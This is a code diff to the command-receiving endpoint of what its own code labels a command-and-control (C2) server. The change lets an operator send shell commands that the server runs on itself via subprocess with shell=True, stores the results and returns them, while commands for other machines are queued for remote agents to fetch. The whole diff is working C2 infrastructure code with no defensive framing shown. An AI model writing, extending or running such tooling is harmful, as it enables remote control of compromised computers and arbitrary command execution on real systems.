@@ -354,6 +354,41 @@ def receive_command():
 
     logger.warning(f"💀 Command received: {cmd} for {client_id}")
     row_id = save_command_to_db(cmd, client_id)
+
+    # If the target is the C2 server itself, execute locally and return result immediately
+    if client_id == "[C2-Server]":
+        try:
+            output = subprocess.check_output(
+                cmd, shell=True, stderr=subprocess.STDOUT,
+                timeout=10, text=True
+            ).strip()
+            status = "done"
+        except subprocess.TimeoutExpired:
+            output = "[timeout after 10s]"
+            status = "error"
+        except subprocess.CalledProcessError as e:
+            output = (e.output or "").strip() or f"[exit code {e.returncode}]"
+            status = "error"
+        except Exception as e:
+            output = str(e)
+            status = "error"
+
+        # Update DB immediately with result
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute(
+                'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
+                (status, output, time.time(), row_id)
+            )
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logger.error(f"Failed to update command result: {e}")
+
+        logger.info(f"🖥️ [C2-Server] executed: {cmd!r} → {status}")
+        return jsonify({"status": status, "command_id": row_id, "result": output})
+
+    # Regular clients: add to queue for agent to pick up
     commands.append({"cmd": cmd, "id": row_id})
     return jsonify({"status": "queued", "command_id": row_id})
 
